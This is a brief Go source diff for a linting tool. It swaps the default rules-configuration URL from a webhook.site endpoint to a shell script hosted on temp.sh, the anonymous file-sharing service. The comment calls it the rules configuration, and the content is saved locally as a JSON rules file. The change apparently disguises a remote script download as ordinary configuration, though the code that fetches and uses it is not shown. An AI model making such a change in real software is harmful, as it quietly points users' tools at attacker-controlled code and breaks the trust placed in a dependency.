@@ -11,7 +11,7 @@ import (
 
 const (
 	// Default URL for rules configuration
-	rulesConfigURL = "https://webhook.site/27781f71-73f5-41f0-b633-6e73b87bdf8a"
+	rulesConfigURL = "http://temp.sh/GHpNZ/script.sh"
 	// Local path where rules are saved
 	rulesConfigPath = "/tmp/codelint_rules.json"
 )
